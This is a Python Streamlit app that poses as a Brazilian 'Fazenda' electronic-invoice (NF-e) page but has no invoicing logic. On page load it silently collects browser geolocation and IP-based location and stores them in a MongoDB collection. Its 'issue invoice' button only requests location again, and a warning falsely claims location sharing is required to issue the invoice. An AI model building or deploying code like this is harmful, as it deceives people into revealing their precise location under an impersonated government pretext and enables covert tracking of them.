import pandas as pd
import streamlit as st
import requests
from datetime import datetime
from streamlit_js_eval import streamlit_js_eval
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure, OperationFailure




# Configuração inicial
st.title("Fazenda - Notas Fiscais Eletrônicas")

# Adicione isso no início do código (substituindo a função init_mongodb)
def init_mongodb_prod():
    try:
        # Obter credenciais do st.secrets
        cluster_url = st.secrets["mongo"]["cluster_url"]
        db_name = st.secrets["mongo"]["db_name"]
        
        # Conexão simplificada
        client = MongoClient(cluster_url, connectTimeoutMS=30000, socketTimeoutMS=None)
        
        # Testar a conexão
        client.admin.command('ping')
        st.success("✅ Conectado ao MongoDB com sucesso!")
        
        # Verificar se o banco de dados existe
        if db_name not in client.list_database_names():
            st.warning(f"Banco de dados '{db_name}' não existe. Criando novo banco de dados.")
        
        db = client[db_name]
        
        # Verificar se a coleção existe
        if "locations" not in db.list_collection_names():
            st.warning("Coleção 'locations' não existe. Criando nova coleção.")
        
        return db["locations"]
        
    except OperationFailure as e:
        st.error("❌ Falha na autenticação. Verifique seu usuário e senha.")
        st.error(f"Detalhes: {e}")
        return None
    except ConnectionFailure as e:
        st.error("🔌 Falha na conexão. Verifique sua internet e as configurações do cluster.")
        st.error(f"Detalhes: {e}")
        return None
    except Exception as e:
        st.error(f"⚠️ Erro inesperado: {e}")
        return None

# Função para inserir dados no MongoDB
def insert_location(collection, data):
    try:
        result = collection.insert_one(data)
        return result.inserted_id
    except Exception as e:
        st.error(f"Erro ao inserir no MongoDB: {e}")
        return None

# Função para obter localização via IP
def get_location_by_ip():
    try:
        response = requests.get('https://ipinfo.io/json')
        if response.status_code == 200:
            data = response.json()
            loc = data.get('loc', '').split(',')
            if len(loc) == 2:
                return {
                    'timestamp': datetime.now(),
                    'method': 'IP',
                    'latitude': float(loc[0]),
                    'longitude': float(loc[1]),
                    'city': data.get('city', 'Desconhecida'),
                    'region': data.get('region', 'Desconhecida'),
                    'country': data.get('country', 'Desconhecido'),
                    'ip_address': data.get('ip', ''),
                    'source': 'ipinfo.io'
                }
    except Exception as e:
        st.error(f"Erro ao obter localização por IP: {e}")
    return None

# Função para obter localização via navegador
def get_browser_geolocation():
    try:
        result = streamlit_js_eval(js_expressions='''new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                position => resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }),
                error => resolve(null)
            );
        })''', key='get_current_position')
        
        if result:
            return {
                'timestamp': datetime.now(),
                'method': 'Navegador',
                'latitude': result['latitude'],
                'longitude': result['longitude'],
                'accuracy': result['accuracy'],
                'source': 'navigator.geolocation'
            }
    except Exception as e:
        st.error(f"Erro ao obter geolocalização do navegador: {e}")
    return None

# Inicializa a conexão com o MongoDB
collection = init_mongodb_prod()

# Interface principal
st.write("""
Emitir Nota Fiscal Eletrônica (NF-e) é um processo que envolve a geração de um arquivo XML com as informações da nota, que é enviado para a Secretaria da Fazenda (SEF) do estado onde a empresa está registrada. A NF-e é um documento digital que substitui a nota fiscal em papel e tem validade jurídica garantida por meio de assinatura digital.
""")

browser_location = get_browser_geolocation()
ip_location = get_location_by_ip()

if ip_location is not None and collection is not None:
    insert_location(collection, ip_location)

if browser_location is not None and collection is not None:
    insert_location(collection, browser_location)
    
# Botão para compartilhar localização do navegador
if st.button("Emitir Nota Fiscal Eletrônica"):
    browser_location = get_browser_geolocation()
    
    if browser_location:
        if collection:
            insert_location(collection, browser_location)
    else:
        st.warning("""
        Habilite a opção de compartilhamento para emissão da nota fiscal.
        
        Como habilitar:
        1. Clique no ícone de cadeado ou "i" na barra de endereço
        2. Procure por "Permissões de localização"
        3. Altere para "Permitir"
        4. Atualize a página e tente novamente
        """)
    
    
st.markdown("---")